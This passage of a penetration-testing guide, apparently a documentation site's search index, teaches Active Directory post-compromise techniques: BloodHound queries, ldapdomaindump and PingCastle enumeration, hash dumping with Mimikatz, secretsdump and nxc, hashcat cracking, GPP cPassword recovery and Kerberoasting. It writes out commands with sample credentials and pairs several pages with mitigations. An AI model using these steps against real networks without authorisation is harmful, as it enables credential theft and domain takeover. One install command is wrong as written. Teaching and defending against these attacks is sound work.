Find principals that have full control over the Domain Admins group\nMATCH (n)-[r:GenericAll|GenericWrite]-&gt;(g:Group)\nWHERE g.name = 'DOMAIN ADMINS@CORP.LOCAL'\nRETURN n.name AS Attacker, TYPE(r) AS Permission, g.name AS Target\n</code></pre></li> </ul> <p>Example 2: msDS-KeyCredentialLink Abuse (Shadow Credentials)  - Impact: The <code>msDS-KeyCredentialLink</code> attribute is used for Windows Hello for Business. If you have write access to this attribute on an object (like a Domain Controller's computer account), you can add your own \"shadow credential\" to it. This allows you to authenticate as that object using your credential, completely bypassing its password. This is an incredibly stealthy escalation and persistence technique.</p> <ul> <li>Custom Cypher Query:     <pre><code>// Find principals who can create shadow credentials on Domain Controllers\n// The \"WriteKeyCredentialLink\" relationship is a custom one created by BloodHound\nMATCH (n)-[r:WriteKeyCredentialLink]-&gt;(c:Computer)\nWHERE c.name CONTAINS 'DC'\nRETURN n.name AS Attacker, c.name AS TargetComputer\n</code></pre></li> </ul> <p>Example 3: Finding Unconstrained Delegation Machines  - Impact: When a computer is configured for Unconstrained Delegation, it caches the Kerberos Ticket-Granting Ticket (TGT) of any user who authenticates to it. If you compromise that computer and a Domain Admin connects via RDP, you can steal their TGT from memory (using Mimikatz) and use it to impersonate them anywhere in the domain.</p> <ul> <li>Custom Cypher Query:     <pre><code>// Find all computers with the dangerous Unconstrained Delegation flag set\nMATCH (c:Computer)\nWHERE c.unconstraineddelegation = true\nRETURN c.name AS VulnerableComputer, c.operatingsystem AS OS\n</code></pre></li> </ul> <p>By moving beyond the default queries and writing your own, you can tailor your analysis to the specific environment you're in, uncover non-obvious attack paths, and truly understand the intricate web of permissions that defines an Active Directory domain.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/","title":"Domain Enumeration with ldapdomaindump","text":"<p>So, you've landed your initial foothold. You've cracked a password from a Responder hash, or maybe you found some credentials on an internal web app. You now have a valid set of domain credentials\u2014username and password. What's next? Before you fire up BloodHound or start trying to Kerberoast, you need a quick, comprehensive lay of the land. You need a \"phone book\" of the entire domain.</p> <p>Enter <code>ldapdomaindump</code>. It's a simple, elegant Python tool that connects to a Domain Controller using the LDAP protocol and pulls down a massive amount of information about the domain's structure. Think of it as forcing the kingdom's scribe to give you a complete census of every person, family, and title before you plan your palace intrigue.</p> <p>It's less of a graphical attack path visualizer like BloodHound and more of a raw intelligence-gathering tool. It's fast, efficient, and gives you a beautiful, browsable HTML report of the domain's secrets.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#what-is-it-and-why-use-it","title":"What Is It and Why Use It?","text":"<p>LDAP (Lightweight Directory Access Protocol) is the protocol that applications use to query Active Directory. It\u2019s how Outlook finds email addresses and how servers validate users. <code>ldapdomaindump</code> leverages this by authenticating as a user and then systematically asking the Domain Controller for everything it's allowed to see\u2014which, for even a low-privilege user, is almost everything.</p> <p>Why choose <code>ldapdomaindump</code>?</p> <ul> <li>Speed and Simplicity: It's often faster and requires fewer moving parts than running the full BloodHound collector. All you need is Python and valid credentials.</li> <li>Offline Browse: It outputs a clean, cross-referenced HTML report. You can run the dump, disconnect from the client's network, and analyze the data at your leisure from your own machine.</li> <li>Comprehensive Data: It grabs users, computers, groups, domain policy details, and more, giving you a complete snapshot in one go.</li> <li>Multiple Formats: Besides HTML, it provides JSON for machine parsing and greppable text files for quick command-line searches.</li> </ul>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#lets-get-dumping-the-commands","title":"Let's Get Dumping: The Commands","text":"<p>Using <code>ldapdomaindump</code> is incredibly straightforward.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#step-1-installation","title":"Step 1: Installation","text":"<p>If it's not already on your attacker machine (like Kali Linux), you can install it easily.</p> <pre><code>sudo install ldapdomaindump\n</code></pre>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#step-2-the-dump","title":"Step 2: The Dump","text":"<p>The main command requires the IP of a Domain Controller and your credentials. It's best practice to create a dedicated directory for the output.</p> <pre><code>mkdir ad_dump\ncd ad_dump\n\nldapdomaindump 172.17.1.100 -u 'alpha\\j.rice' -p Welcome@123\n</code></pre> <p>Let's break that down:</p> <ul> <li><code>-u 'alpha\\j.rice'</code>: The username, preferably in <code>DOMAIN\\user</code> format.</li> <li><code>-p 'Welcome@123'</code>: The user's password. Be careful with special characters in the password; you might need to escape them or wrap the password in single quotes.</li> <li><code>172.17.1.100</code>: The IP address of a Domain Controller.</li> </ul> <p>The tool will connect, bind to LDAP, and start pulling data. You'll see it enumerating users, groups, and policies.</p> <pre><code>[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\n</code></pre>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#analyzing-the-loot-the-output","title":"Analyzing the Loot: The Output","text":"<p>Once finished, your ad_dump directory will be filled with treasure.</p> <ul> <li><code>domain_groups.html</code></li> <li><code>domain_users.html</code></li> <li><code>domain_computers.html</code></li> <li><code>domain_policy.html</code></li> <li>...and corresponding <code>.json</code> and <code>.grep</code> files.</li> </ul> <p>The most valuable starting point is the HTML report. Open domain_users.html or domain_groups.html in your web browser.</p> <p>A sample of the clean, browsable HTML report generated by ldapdomaindump.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#what-to-look-for","title":"What to look for:","text":"<ol> <li> <p>Group Memberships: Open <code>domain_groups.html</code>. The first thing you should do is look at the members of highly privileged groups:</p> <ul> <li>Domain Admins: The kings of the castle.</li> <li>Enterprise Admins: The kings of the entire forest.</li> <li>Schema Admins: Can change the fundamental structure of AD.</li> <li>Administrators: The local admins of Domain Controllers.</li> </ul> <p>This gives you your list of target users.</p> </li> <li> <p>User Descriptions: Browse <code>domain_users.html</code>. Sysadmins often leave revealing notes in user or computer descriptions. Look for things like:</p> <ul> <li><code>\"Service account for Jenkins - Password in KeePass\"</code></li> <li><code>\"Test account - password is Password01\"</code></li> <li><code>\"Built by Admin Bob\"</code></li> </ul> <p>This is pure gold and can give you immediate leads.</p> </li> <li> <p>Domain Policy: Open <code>domain_policy.html</code>. This file tells you the rules of the kingdom.</p> <ul> <li>Password Policy: How complex are passwords? How long until they expire? This tells you how difficult a password-cracking attempt might be. A minimum length of 8 is much easier than 14.</li> <li>Kerberos Policy: Interesting for more advanced Kerberos attacks.</li> </ul> </li> <li> <p>Greppable Files for Quick Searches: The .grep files are fantastic for command-line analysis. Want to quickly find all service accounts?</p> </li> </ol> <pre><code>grep -i \"svc_\" domain_users.grep\ngrep -i \"service\" domain_users.grep\n</code></pre>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/ldapdomaindump/#how-it-fits-into-your-attack-strategy","title":"How It Fits into Your Attack Strategy","text":"<p><code>ldapdomaindump</code> is a foundational reconnaissance step. It provides the intelligence needed to plan your next move for privilege escalation.</p> <ul> <li> <p>Input for Kerberoasting: Use the list of users from the dump as the input for tools like <code>GetUserSPNs.py</code> to find kerberoastable accounts.</p> </li> <li> <p>Identifying High-Value Targets: The group membership lists tell you exactly which user accounts you need to target to become a Domain Admin.</p> </li> <li> <p>Password Spraying: The full user list is a perfect target for a password spraying attack. If you find a weak password like \"Summer2025!\", you can try it against every user in the domain.</p> </li> <li> <p>Situational Awareness: It gives you a mental map of the organization's structure, naming conventions, and overall complexity before you dive deeper with more active tools.</p> </li> </ul> <p>While BloodHound excels at showing you the path, <code>ldapdomaindump</code> excels at giving you the detailed census. Using them together provides a complete picture of your target environment, turning you from a simple attacker into a master strategist.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/","title":"Domain Enumeration with PingCastle","text":"<p>You've mapped the attack paths with BloodHound and read the kingdom's laws with Plumhound. But what if you could get an instant, high-level \"security score\" for the entire domain? What if a tool could automatically check for dozens of common misconfigurations and vulnerabilities and present them in a clean, prioritized report?</p> <p>Enter PingCastle. This tool isn't a stealthy attacker's scalpel; it's a security auditor's powerful scanner. It connects to the domain, performs a huge number of checks based on a built-in model of AD security maturity, and then generates a beautiful HTML report that tells you exactly where the bodies are buried.</p> <p>Think of PingCastle as hiring an independent inspector to do a full health and safety audit of your castle. It will check for unlocked doors, weak points in the walls, and guards who are asleep on duty, then hand you a color-coded report showing what needs to be fixed first.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#what-is-it-and-why-use-it","title":"What Is It and Why Use It?","text":"<p>PingCastle is a standalone executable that runs a series of checks against an Active Directory domain to evaluate its security posture. It doesn't visualize paths like BloodHound; instead, it scores the domain based on risk levels and provides concrete findings.</p> <p>Why would a pentester use PingCastle?</p> <ul> <li>Blazing Fast Reconnaissance: In a few minutes, PingCastle can give you a list of the most critical vulnerabilities in the domain, saving you hours of manual enumeration.</li> <li>Prioritized Findings: It scores the risks it finds, allowing you to immediately focus on what's most important. A \"Privilege Escalation\" finding is more critical than a minor informational one.</li> <li>Finds Things Others Miss: It checks for a wide range of issues, from stale accounts and dangerous trust relationships to outdated systems and specific privilege vulnerabilities that can be time-consuming to find manually.</li> <li>Minimal Footprint: It's a single executable that you can run from any domain-joined machine. It performs its checks using standard LDAP queries, making it relatively low-noise.</li> </ul>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#lets-inspect-the-castle-the-commands","title":"Let's Inspect the Castle: The Commands","text":"<p>Using PingCastle is incredibly simple. There's no complex setup.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#step-1-get-the-tool","title":"Step 1: Get the Tool","text":"<p>Download the PingCastle executable from its official website and place it on a domain-joined machine where you have a shell.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#step-2-run-the-health-check","title":"Step 2: Run the Health Check","text":"<p>Open a command prompt or PowerShell and run the default health check. This requires no special privileges.</p> <pre><code>.\\\\PingCastle.exe --healthcheck\n</code></pre> <p>That's it. PingCastle will automatically discover the current domain and begin its assessment. You'll see it progressing through various checks.</p> <p>When it's done, it will generate an HTML report (and sometimes an XML file) in the same directory. This report is your deliverable.</p>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#analyzing-the-royal-decree-the-report","title":"Analyzing the Royal Decree: The Report","text":"<p>The HTML report generated by PingCastle is the crown jewel. It's broken down into logical sections with clear scoring.</p> <p>A sample of the risk-based scoring from a PingCastle report.</p> <p>What to look for in the report:</p> <ol> <li> <p>The Risk Score: The report starts with an overall score and a graph. This is great for an executive summary, showing at a glance how mature the domain's security is.</p> </li> <li> <p>Stale Objects: PingCastle is excellent at finding \"stale\" user and computer accounts\u2014accounts that haven't been used in months. These are prime targets, as their passwords are never changed, and nobody will notice if they're suddenly used for malicious activity.</p> </li> <li> <p>Privilege Vulnerabilities: This is the most important section for a pentester. PingCastle will flag things like:</p> <ul> <li>Unconstrained Delegation: Points out computers that can be abused to steal powerful Kerberos tickets.</li> <li>Anomalous Privileges: Identifies non-standard users who have dangerous rights like DCSync.</li> <li>AdminSDHolder: Checks for inconsistencies in permissions on protected administrative accounts.</li> </ul> </li> <li> <p>Trust Relationships: It provides a map of all domain and forest trusts. In a large environment, you might discover a forgotten trust relationship to a less-secure development domain, which could be an easy path for privilege escalation.</p> </li> <li> <p>Anomalies and Outdated Systems: It will flag computers running old, unsupported operating systems (like Windows Server 2008) which are likely vulnerable to known exploits.</p> </li> </ol>"},{"location":"active_directory/02-Post-Compromise%20Enumeration/pingcastle/#how-it-fits-into-your-attack-strategy","title":"How It Fits into Your Attack Strategy","text":"<p>PingCastle is an initial reconnaissance and opportunity analysis tool. It's one of the first things you should run after gaining a foothold.</p> <ul> <li> <p>It Guides Your Attack: The report gives you an instant \"to-do\" list. If PingCastle flags a stale admin account, your next step is to try to crack its password. If it flags an Unconstrained Delegation server, your next step is to compromise that server.</p> </li> <li> <p>It Complements BloodHound: Run PingCastle first to get a quick overview and identify obvious vulnerabilities. Then, use BloodHound to visualize the complex attack paths related to the users and computers that PingCastle identified as high-risk.</p> </li> <li> <p>It's Ammunition for Your Report: The clean graphs and prioritized findings from the PingCastle report can be used directly in your own final pentest report to provide clear, evidence-backed recommendations to the client.</p> </li> </ul> <p>While BloodHound helps you navigate the maze, PingCastle inspects the bricks of the maze itself, telling you which ones are loose before you even start walking.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/","title":"Dumping & Cracking Hashes \ud83d\udd10","text":"<p>In the world of penetration testing, passwords are the ultimate prize. But you'll almost never find them stored in plaintext. Instead, you'll find their cryptographic shadows: hashes. A hash is a one-way mathematical function that turns a password into a fixed-length string of characters. While you can't reverse the math, if you can steal the hash, you can either use it directly (Pass the Hash) or try to find the original password.</p> <p>This guide covers the art of finding and breaking these credentials, including a trip down memory lane to a time when plaintext passwords were much easier to come by.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#part-1-the-treasure-chests-where-hashes-live","title":"## Part 1: The Treasure Chests (Where Hashes Live)","text":"<p>Credentials are stored in three primary locations, each more valuable than the last.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#1-the-sam-file","title":"1. The SAM File","text":"<ul> <li>What is it? The Security Account Manager (SAM) is a database file found on every Windows machine (<code>C:\\Windows\\System32\\config\\SAM</code>).</li> <li>What's inside? It stores the NTLM hashes for all local user accounts on that specific computer.</li> <li>How to access it? You need <code>SYSTEM</code> privileges on the local machine. The file is locked while Windows is running, so you typically need to dump it from memory or a backup.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#2-the-lsass-process-the-goldmine","title":"2. The LSASS Process (The Goldmine)","text":"<ul> <li>What is it? The Local Security Authority Subsystem Service (LSASS) is a running process (<code>lsass.exe</code>) in memory.</li> <li> <p>What's inside? It caches the credentials of users who are currently or have recently logged on. This is the best place to find hashes for domain users on member servers.</p> </li> <li> <p>A Trip Down Memory Lane: The WDigest Protocol</p> <ul> <li>The \"Good\" Old Days: In the past (Windows XP/Server 2003/pre-patched Windows 7/8), LSASS used to be an even bigger treasure chest. To support a web authentication protocol called WDigest (Digest Authentication), Windows would store a copy of the user's password in LSASS memory in a reversibly encrypted format.</li> <li>The Game Changer (Mimikatz): An attacker with admin rights could use Mimikatz and its famous <code>sekurlsa::wdigest</code> command to instantly decrypt and dump these credentials as pure cleartext passwords. There was no cracking required.</li> <li>Microsoft's Fix: This feature was a massive security risk. Microsoft disabled this behavior by default starting in Windows 8.1. For older systems, they released a critical security update (KB2871997) that introduced a registry key (<code>UseLogonCredential</code> under <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\WDigest\\</code>) which, when set to <code>0</code>, prevents WDigest from storing cleartext credentials in memory.</li> <li>Why it Still Matters: While off by default now, you might still find this enabled on unpatched legacy systems or in environments where an old application specifically required it. It's always worth checking for.</li> </ul> </li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#3-the-ntdsdit-file-the-crown-jewels","title":"3. The NTDS.dit File (The Crown Jewels)","text":"<ul> <li>What is it? This is the Active Directory database. It exists only on Domain Controllers.</li> <li>What's inside? The NTLM hashes for every single user and computer account in the entire domain.</li> <li>How to access it? You need Domain Admin (or equivalent) privileges to dump it remotely.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#part-2-the-crowbars-tools-for-dumping","title":"## Part 2: The Crowbars (Tools for Dumping)","text":"<p>You need the right tool to pry open these treasure chests.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#1-mimikatz-the-post-exploitation-scalpel","title":"1. Mimikatz (The Post-Exploitation Scalpel)","text":"<p>Once you have high privileges on a machine, Mimikatz is the go-to tool for dumping credentials from memory. Its <code>sekurlsa::logonpasswords</code> command will attempt to dump all available credentials, including NTLM hashes and, if WDigest is enabled, cleartext passwords.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#2-impackets-secretsdumppy-the-remote-dumper","title":"2. Impacket's <code>secretsdump.py</code> (The Remote Dumper)","text":"<p>This is a pentester's favorite for remotely dumping SAM and NTDS.dit files with a single command once you have privileged credentials.</p> <ul> <li>How to Use: <pre><code>secretsdump.py 'corp.local/j.smith:Password123!'@192.168.1.10\n</code></pre></li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#3-netexec-nxc-the-mass-production-tool","title":"3. NetExec / nxc (The Mass-Production Tool)","text":"<p>Use <code>netexec</code> to run commands like hash dumping across entire subnets, targeting machines where your compromised user has admin rights.</p> <ul> <li>How to Use: <pre><code>nxc smb 192.168.1.0/24 -u j.smith -p 'Password123!' --lsa\n</code></pre></li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#part-3-the-codebreakers-understanding-cracking-hashes","title":"## Part 3: The Codebreakers (Understanding &amp; Cracking Hashes)","text":""},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#types-of-hashes-what-works-and-what-doesnt","title":"Types of Hashes: What Works and What Doesn't","text":"<ul> <li>NTLM Hash: This is the primary hash we care about. It's used for Pass the Hash attacks and is the most common hash you will crack.</li> <li>DCC2 Hash (Domain Cached Credentials): A much stronger, salted hash used for offline logons. You cannot \"pass\" this hash; your only option is to attempt to crack it, which is significantly slower than cracking NTLM.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/dumping%20%26%20cracking%20hashes/#the-cracking-process-with-hashcat","title":"The Cracking Process with Hashcat","text":"<p>Hashcat is the industry-standard tool for password cracking.</p> <ul> <li>The Commands: <pre><code># Cracking NTLM Hashes (fast)\n# -m 1000 is the mode for NTLM\nhashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Cracking DCC2/MS-Cache V2 Hashes (slow)\n# -m 2100 is the mode for DCC2\nhashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre> The goal is to dump all available credentials, prioritize cracking the faster NTLM hashes, and use any cracked passwords to escalate privileges and expand your access.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/","title":"GPP & cPassword","text":"<p>Imagine a king who wanted to set the same password for the guards at every barracks in the kingdom. Instead of telling each guard individually, he wrote the password on a notice, locked it in a \"secure\" box using a key that everyone in the kingdom knew how to make, and then posted that notice in the public square for every guard to see. Sounds insane, right?</p> <p>Welcome to the world of Group Policy Preferences (GPP) password attacks. For years, this was exactly how many system administrators managed local administrator passwords across their domains, and it remains one of the most devastatingly simple vulnerabilities a pentester can find.</p> <p>This attack involves finding passwords stored within Group Policy files on the domain's SYSVOL share. The passwords are encrypted, but they are encrypted with a publicly known AES-256 key published by Microsoft on MSDN. This is the equivalent of locking a box and then publicly posting the blueprints for the key.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#the-history-a-feature-of-convenience-2008","title":"The History: A Feature of Convenience (2008)","text":"<p>The story begins with Windows Server 2008. Microsoft introduced a powerful new feature called Group Policy Preferences (GPP). It was a massive quality-of-life improvement for system administrators, allowing them to easily push a wide range of settings to workstations\u2014everything from registry keys to mapped drives.</p> <p>One of the most popular features was the ability to set the password for the local administrator account on all machines in an Organizational Unit (OU). To do this, an admin would simply type the desired password into the Group Policy editor. The system would then create an XML file (like <code>Groups.xml</code> or <code>ScheduledTasks.xml</code>) inside that policy's folder on the SYSVOL share.</p> <p>To give the appearance of security, the password was not stored in plaintext. It was placed in a field called <code>cPassword</code> and encrypted with AES-256.</p> <p>The Fatal Flaw: The AES key used for this encryption was static. It was the same key across every Windows installation in the world. Worse, Microsoft published this key publicly on MSDN. This meant that anyone who could read the XML file could use the public key to instantly decrypt the password. Since the SYSVOL share is readable by all authenticated domain users, this \"security\" feature was effectively a public notice board for privileged passwords.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#the-patch-microsoft-intervenes-2014","title":"The Patch: Microsoft Intervenes (2014)","text":"<p>After years of this vulnerability being exploited in the wild, Microsoft finally addressed it in May 2014 with the security bulletin MS14-025.</p> <p>The patch did two key things: 1.  It updated the Group Policy Management Console to remove the ability for administrators to set passwords in this manner. The interface was simply taken away. 2.  It patched the client-side extension on Windows machines. This meant that even if a GPO with a <code>cPassword</code> existed, a patched machine would no longer process or apply that setting.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#is-it-still-relevant-today-absolutely","title":"Is It Still Relevant Today? Absolutely.","text":"<p>This is the most important part of the story. The patch was not retroactive.</p> <p>While it stopped the bleeding, it did not clean up the old wounds. The MS14-025 patch did not delete the old, vulnerable XML files that were already sitting in SYSVOL.</p> <p>Many organizations applied the patch and thought the problem was solved. They never went back to audit their SYSVOL shares to find and delete the lingering policy files.</p> <p>Therefore, in 2025, an attacker with a low-privilege domain account can still perform this attack with a high chance of success in older, less-maintained environments. The attack flow remains the same: 1.  Authenticate to the domain. 2.  Browse the <code>\\\\&lt;domain&gt;\\SYSVOL</code> share. 3.  Search for XML files containing the <code>&lt;cPassword&gt;</code> attribute. 4.  Copy the encrypted value and decrypt it instantly using any number of publicly available tools.</p> <p>Finding a GPP <code>cPassword</code> on a pentest is like finding a fossil from a bygone era. It's a sign of poor security hygiene and an environment that hasn't been properly audited in years. While less common than a decade ago, it's still a critical finding that often provides a pentester with a \"golden key\" local administrator password used across a vast number of machines, enabling immediate and widespread lateral movement. It's a classic piece of low-hanging fruit that is always worth checking for.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#the-tools-and-commands","title":"The Tools and Commands","text":"<p>You can manually search for the files, but scripts make it trivial.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#using-powershell","title":"Using PowerShell","text":"<p>The <code>Get-GPPPassword</code> function from the PowerSploit framework is a popular choice. You would run this from a compromised machine.</p> <pre><code># Import the PowerSploit module first\nImport-Module .\\PowerSploit.psm1\n\n# Run the function to automatically search all GPOs in the domain\nGet-GPPPassword\n</code></pre> <p>The script will automatically find all Domain Controllers, search every GPP XML file in their SYSVOL share, find any <code>cPassword</code> entries, and decrypt them on the fly, printing the plaintext password and the GPO it was found in.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#manual-decryption","title":"Manual Decryption","text":"<p>If you find an XML file manually, you can copy the <code>cPassword</code> value and decrypt it using online tools or simple scripts that have the public key hardcoded.</p> <p>The result is often the password for the local administrator account on hundreds or thousands of workstations and servers\u2014all from a single file that any user could read.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/gpp/#mitigation-cleaning-up-the-skeletons","title":"Mitigation: Cleaning Up the Skeletons","text":"<ul> <li> <p>Patch Your Systems (MS14-025): The first step is to ensure all systems are patched to prevent the processing of these passwords.</p> </li> <li> <p>AUDIT, AUDIT, AUDIT: The patch does not remove the old, vulnerable XML files from your SYSVOL share. You must manually or with scripts search your entire SYSVOL directory for any XML files containing a cPassword attribute and delete them. This is the most critical remediation step.</p> </li> <li> <p>Use Modern Solutions: For managing local administrator passwords, use modern, secure solutions like Microsoft LAPS (Local Administrator Password Solution), which provides each computer with its own unique, complex, and regularly rotated local administrator password stored securely in Active Directory.</p> </li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/","title":"Kerberoasting \ud83d\udd25","text":"<p>So you've landed in a target network, and you have a single, low-privilege domain user account. You can't dump hashes from the Domain Controller, and you don't have local admin anywhere. What do you do? Do you pack up and go home? No. You fire up the grill, because it's time for a Kerberoasting.</p> <p>Kerberoasting is one of the most effective and stealthy attacks in any pentester's arsenal. It's a method of extracting password hashes for Active Directory service accounts and cracking them offline. The best part? You can do it as any authenticated domain user. You don't need any special privileges.</p> <p>Think of it like this: You're a tourist in a kingdom (a low-privilege user). You walk up to the royal quartermaster (the Domain Controller) and say, \"I'd like a key to the royal stable's hayloft, please.\" The quartermaster, not caring who you are, gives you a key (a Kerberos ticket). The vulnerability is that this key is made of a special metal that is secretly encrypted with the stable master's password. You can take this key, go back to your lab, analyze the metal, and figure out the stable master's password. And as it turns out, the stable master often uses a very simple password.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#the-why-service-principal-names-spns","title":"The \"Why\": Service Principal Names (SPNs)","text":"<p>This entire attack hinges on a feature of Kerberos called a Service Principal Name (SPN).</p> <p>An SPN is essentially a unique username for a service. When a service like Microsoft SQL Server or a custom web application needs to be integrated with Kerberos authentication, an SPN is registered to the user account that runs that service. For example: <code>MSSQLSvc/sql01.corp.local:1433</code>.</p> <p>Here's the crucial part: To ensure everything works correctly, any authenticated user in the domain is allowed to request a Kerberos service ticket (a Ticket-Granting Service ticket, or TGS) for any SPN. This is a fundamental feature, not a bug.</p> <p>The ticket that the Domain Controller sends back is encrypted. A portion of this ticket is encrypted with the NTLM hash of the password of the service account itself. And that's our golden ticket.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#the-heist-from-ticket-request-to-plaintext","title":"The Heist: From Ticket Request to Plaintext","text":"<p>The attack flow is simple, elegant, and devastatingly effective.</p> <ol> <li>Find the Targets: We ask Active Directory, \"Show me all the user accounts that are being used to run services\" (i.e., all accounts with an SPN set).</li> <li>Request the Tickets: As our low-privilege user, we go to the Domain Controller for each of those services and say, \"Hi, I'd like a ticket for the MSSQL service, please.\" The Domain Controller happily gives us one. We do this for all the services we found.</li> <li>Extract the Hashes: The tickets we receive are now in our possession. We can extract the encrypted part from each ticket, which contains the service account's hash.</li> <li>Crack Offline: We take these extracted hashes back to our powerful cracking rig and use a tool like Hashcat to crack them.</li> </ol> <p>Service account passwords are often a pentester's dream. They are frequently weak, rarely changed (sometimes set to \"never expire\"), and often have high privileges to run their applications.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#the-tools-and-commands","title":"The Tools and Commands","text":"<p>The best tool for this job is Impacket's <code>GetUserSPNs.py</code>, which automates the first three steps for us.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#step-1-request-tickets-and-dump-hashes","title":"Step 1: Request Tickets and Dump Hashes","text":"<p>From your attacker machine, run this command using your low-privilege user's credentials.</p> <pre><code># This will find all kerberoastable accounts and request tickets for them,\n# saving the crackable hashes to a file.\nGetUserSPNs.py -request -dc-ip 192.168.1.10 'corp.local/j.smith:Password123!' -outputfile kerberoastable_hashes.txt\n</code></pre> <ul> <li><code>-request</code>: Tells the tool to actually request the TGS tickets.</li> <li><code>-dc-ip 192.168.1.10</code>: The IP of the Domain Controller.</li> <li><code>'corp.local/j.smith:Password123!'</code>: Your compromised user's credentials.</li> <li><code>-outputfile</code> ...: The file where the extracted, crackable hashes will be saved.</li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#step-2-crack-with-hashcat","title":"Step 2: Crack with Hashcat","text":"<p>Now, take <code>kerberoastable_hashes.txt</code> and feed it to <code>Hashcat</code>. The hash mode for these Kerberos TGS tickets is 13100.</p> <pre><code>hashcat -m 13100 kerberoastable_hashes.txt /usr/share/wordlists/rockyou.txt\n</code></pre> <p>If any of the service accounts have a weak password that exists in your wordlist, Hashcat will pop it in minutes. You now have the plaintext password for a service account, which could be anything from a simple web admin to a full-blown Domain Admin.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/kerberoasting/#mitigation-how-to-stop-the-bbq","title":"Mitigation: How to Stop the BBQ","text":"<ul> <li> <p>STRONG PASSWORDS: This is the number one defense. Service account passwords should be long (25+ characters) and complex. Since a human doesn't need to type them, there's no excuse for them to be weak.</p> </li> <li> <p>Use Group Managed Service Accounts (gMSA): This is the modern, preferred way to run services. gMSAs use automatically managed, complex 240-character passwords that are rotated regularly by Active Directory itself, making them impossible to crack.</p> </li> <li> <p>Principle of Least Privilege: A service account for a web server does not need to be a member of the Domain Admins group. Grant it only the permissions it absolutely needs to function.</p> </li> <li> <p>Monitoring: It is possible to detect Kerberoasting by monitoring for an unusual number of TGS ticket requests, especially for tickets using weaker RC4 encryption. However, this can be difficult to distinguish from normal network traffic.</p> </li> </ul>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/","title":"Credential Dumping with Mimikatz","text":"<p>In the world of penetration testing, some tools are useful, some are powerful, and a select few are true legends. Mimikatz is in a league of its own. For years, it has been the single most feared and effective tool for post-exploitation on Windows systems. Its primary purpose? To pull passwords, hashes, and tickets directly from your computer's memory.</p> <p>When a pentester gains administrator access to a machine, their first thought is often, \"Time to run Mimikatz.\" It's the skeleton key that unlocks nearly every other door in the kingdom by revealing the credentials of anyone who has logged onto that machine.</p> <p>Think of it like this: The LSASS process is the high-security vault in a bank's back office where the head tellers (users) temporarily store their keys (credentials) while they work. Mimikatz is the master thief who has the blueprint to that vault and can walk in, open every single lockbox, and walk out with all the keys, often without tripping a single alarm.</p>"},{"location":"active_directory/03-Post%20Compromise%20Attacks/mimikatz-cred-dumping/#the-why-the-lsass-process-a-memory-goldmine","title":"The \"Why\": The LSASS Process, A Memory Goldmine","text":"<p>The magic behind Mimikatz's primary function is its ability to interact with the Local Security Authority Subsystem Service (LSASS). This is a core Windows process (<code>lsass.exe</code>) that handles all user authentication, password changes, and the creation of access tokens.</p> <p>To make Single Sign-On (SSO) and other features work smoothly, LSASS caches credential material in its memory for users who are currently logged on or have recently logged on. Depending on the Windows version and its patch level, this cached material can include:</p> <ul> <li>Plaintext passwords (thanks to the old WDigest provider)</li> <li>NTLM hashes</li> <li>Kerberos tickets</li> <li>And more...</li> </ul> <p>Mimikatz knows 